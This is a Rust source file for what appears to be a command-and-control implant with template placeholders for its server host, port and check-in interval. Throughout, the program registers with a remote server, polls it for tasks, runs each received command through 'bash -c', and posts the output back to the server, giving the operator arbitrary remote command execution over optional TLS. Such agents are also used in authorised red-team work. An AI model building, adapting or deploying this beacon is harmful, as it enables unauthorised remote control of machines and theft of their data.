use std::io::{Read, Write};
use std::net::TcpStream;
use std::process::Command;
use std::thread;
use std::time::Duration;

// TLS support with native-tls (smallest footprint)
use native_tls::TlsConnector;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Static string to derive check-in interval from
    // const CHECK_IN_INTERVAL_STR: &str = "@JELLYFISH_CHECKIN_SECONDS@";
    const CHECK_IN_INTERVAL_STR: &str = "2";

    // Configuration - these would be replaced during compilation
    // const USE_HTTPS: bool = "@JELLYFISH_USE_HTTPS@";
    // const HOST: &str = "@JELLYFISH_HOST@";
    // const PORT: u16 = "@JELLYFISH_PORT@";
    const USE_HTTPS: bool = true;
    const HOST: &str = "127.0.0.1";
    const PORT: u16 = 8080;

    // Extract the number from the static string (30 in this case)
    let check_in_interval = CHECK_IN_INTERVAL_STR
        .chars()
        .filter(|c| c.is_ascii_digit())
        .collect::<String>()
        .parse::<u64>()
        .unwrap_or(30);

    println!("Check-in interval: {} seconds", check_in_interval);
    println!("Using HTTPS: {}", USE_HTTPS);
    println!("Target: {}:{}", HOST, PORT);

    let config_id = "@JELLYFISH_CONFIG_ID@###############";
    println!("Config ID: {}", config_id);

    // Initial registration
    println!("Performing initial registration...");
    let mut client_id = perform_registration(config_id, USE_HTTPS, HOST, PORT)?;

    // Periodic check-in loop
    loop {
        println!("Waiting {} seconds before next check-in...", check_in_interval);
        thread::sleep(Duration::from_secs(check_in_interval));

        println!("Performing periodic check-in...");
        match perform_checkin(&client_id, config_id, USE_HTTPS, HOST, PORT) {
            Ok(()) => println!("Check-in successful!"),
            Err(e) => {
                println!("Check-in failed: {}", e);
                // If check-in fails, try to re-register
                println!("Attempting to re-register...");
                match perform_registration(config_id, USE_HTTPS, HOST, PORT) {
                    Ok(new_client_id) => {
                        client_id = new_client_id;
                        println!("Re-registration successful!");
                    }
                    Err(reg_err) => {
                        println!("Re-registration failed: {}", reg_err);
                    }
                }
            }
        }
    }
}

// Unified HTTP/HTTPS connection handler
enum Connection {
    Plain(TcpStream),
    Tls(native_tls::TlsStream<TcpStream>),
}

impl Connection {
    fn connect(host: &str, port: u16, use_https: bool) -> Result<Self, Box<dyn std::error::Error>> {
        let stream = TcpStream::connect((host, port))?;

        if use_https {
            let connector = TlsConnector::new()?;
            let tls_stream = connector.connect(host, stream)?;
            Ok(Connection::Tls(tls_stream))
        } else {
            Ok(Connection::Plain(stream))
        }
    }
}

impl Write for Connection {
    fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
        match self {
            Connection::Plain(stream) => stream.write(buf),
            Connection::Tls(stream) => stream.write(buf),
        }
    }

    fn flush(&mut self) -> std::io::Result<()> {
        match self {
            Connection::Plain(stream) => stream.flush(),
            Connection::Tls(stream) => stream.flush(),
        }
    }
}

impl Read for Connection {
    fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
        match self {
            Connection::Plain(stream) => stream.read(buf),
            Connection::Tls(stream) => stream.read(buf),
        }
    }
}

fn http_request(
    method: &str,
    host: &str,
    port: u16,
    path: &str,
    headers: &[(&str, &str)],
    body: Option<&str>,
    use_https: bool,
) -> Result<String, Box<dyn std::error::Error>> {
    let mut conn = Connection::connect(host, port, use_https)?;

    // Build HTTP request
    let mut request = format!("{} {} HTTP/1.1\r\nHost: {}\r\n", method, path, host);

    if let Some(body) = body {
        request.push_str(&format!("Content-Length: {}\r\n", body.len()));
    }

    for (key, value) in headers {
        request.push_str(&format!("{}: {}\r\n", key, value));
    }

    request.push_str("Connection: close\r\n\r\n");

    if let Some(body) = body {
        request.push_str(body);
    }

    // Send request
    conn.write_all(request.as_bytes())?;

    // Read response
    let mut response = String::new();
    conn.read_to_string(&mut response)?;

    // Extract body (after double CRLF)
    if let Some(pos) = response.find("\r\n\r\n") {
        Ok(response[pos + 4..].to_string())
    } else {
        Ok(response)
    }
}

fn perform_registration(
    config_id: &str,
    use_https: bool,
    host: &str,
    port: u16,
) -> Result<String, Box<dyn std::error::Error>> {
    let headers = [("Config-Id", config_id)];
    let response = http_request("GET", host, port, "/register", &headers, None, use_https)?;

    println!("Registration response: {}", response);

    // Simple JSON parsing to extract client_id
    if let Some(start) = response.find("\"client_id\":\"") {
        let start_pos = start + 13; // Length of "\"client_id\":\""
        if let Some(end) = response[start_pos..].find("\"") {
            let client_id = &response[start_pos..start_pos + end];
            println!("Registered with Client ID: {}", client_id);
            return Ok(client_id.to_string());
        }
    }

    Err("Failed to extract client_id from registration response".into())
}

fn perform_checkin(
    client_id: &str,
    config_id: &str,
    use_https: bool,
    host: &str,
    port: u16,
) -> Result<(), Box<dyn std::error::Error>> {
    let headers = [("Config-Id", config_id), ("Client-Id", client_id)];
    let response = http_request("GET", host, port, "/tasking", &headers, None, use_https)?;

    println!("Check-in response: {}", response);

    // Simple task parsing and execution
    if response.contains("\"status\":\"pending\"") {
        execute_tasks_from_response(client_id, config_id, use_https, host, port, &response)?;
    }

    Ok(())
}

fn execute_tasks_from_response(
    client_id: &str,
    config_id: &str,
    use_https: bool,
    host: &str,
    port: u16,
    response: &str,
) -> Result<(), Box<dyn std::error::Error>> {
    // Very basic task extraction - this would need to be more robust for production
    let lines: Vec<&str> = response.lines().collect();
    let mut task_id = String::new();
    let mut command = String::new();

    for line in lines {
        if line.contains("\"task_id\":\"") {
            if let Some(start) = line.find("\"task_id\":\"") {
                let start_pos = start + 11;
                if let Some(end) = line[start_pos..].find("\"") {
                    task_id = line[start_pos..start_pos + end].to_string();
                }
            }
        }
        if line.contains("\"command\":\"") {
            if let Some(start) = line.find("\"command\":\"") {
                let start_pos = start + 11;
                if let Some(end) = line[start_pos..].find("\"") {
                    command = line[start_pos..start_pos + end].to_string();
                }
            }
        }
    }

    if !task_id.is_empty() && !command.is_empty() {
        execute_task(client_id, config_id, &task_id, &command, use_https, host, port)?;
    }

    Ok(())
}

fn execute_task(
    client_id: &str,
    config_id: &str,
    task_id: &str,
    command: &str,
    use_https: bool,
    host: &str,
    port: u16,
) -> Result<(), Box<dyn std::error::Error>> {
    println!("Executing task {}: {}", task_id, command);

    if command.trim().is_empty() {
        println!("Empty command, skipping task {}", task_id);
        return Ok(());
    }

    let output = Command::new("bash")
        .arg("-c")
        .arg(command)
        .output();

    let (return_code, stdout, stderr) = match output {
        Ok(output) => {
            let return_code = output.status.code().unwrap_or(-1);
            let stdout = String::from_utf8_lossy(&output.stdout).to_string();
            let stderr = String::from_utf8_lossy(&output.stderr).to_string();
            (return_code, stdout, stderr)
        }
        Err(e) => {
            let error_msg = format!("Failed to execute command: {}", e);
            (-1, String::new(), error_msg)
        }
    };

    println!("Task {} completed with return code: {}", task_id, return_code);
    println!("STDOUT: {}", stdout);
    println!("STDERR: {}", stderr);

    send_task_result(client_id, config_id, task_id, return_code, &stdout, &stderr, use_https, host, port)?;

    Ok(())
}

fn send_task_result(
    client_id: &str,
    config_id: &str,
    task_id: &str,
    return_code: i32,
    stdout: &str,
    stderr: &str,
    use_https: bool,
    host: &str,
    port: u16,
) -> Result<(), Box<dyn std::error::Error>> {
    // Get current timestamp using system date command
    let timestamp_output = Command::new("date")
        .arg("+%s")
        .output()?;
    let timestamp = String::from_utf8_lossy(&timestamp_output.stdout).trim().to_string();

    // Manually construct JSON to avoid serde dependency
    let json_data = format!(
        r#"{{"task_id":"{}","return_code":{},"stdout":"{}","stderr":"{}","completed_at":"{}"}}"#,
        escape_json_string(task_id),
        return_code,
        escape_json_string(stdout),
        escape_json_string(stderr),
        timestamp
    );

    let headers = [
        ("Content-Type", "application/json"),
        ("Config-Id", config_id),
        ("Client-Id", client_id),
    ];

    let response = http_request("POST", host, port, "/task_result", &headers, Some(&json_data), use_https)?;

    println!("Task result sent successfully for task {}", task_id);
    println!("Response: {}", response);

    Ok(())
}

fn escape_json_string(s: &str) -> String {
    s.replace("\\", "\\\\")
        .replace("\"", "\\\"")
        .replace("\n", "\\n")
        .replace("\r", "\\r")
        .replace("\t", "\\t")
}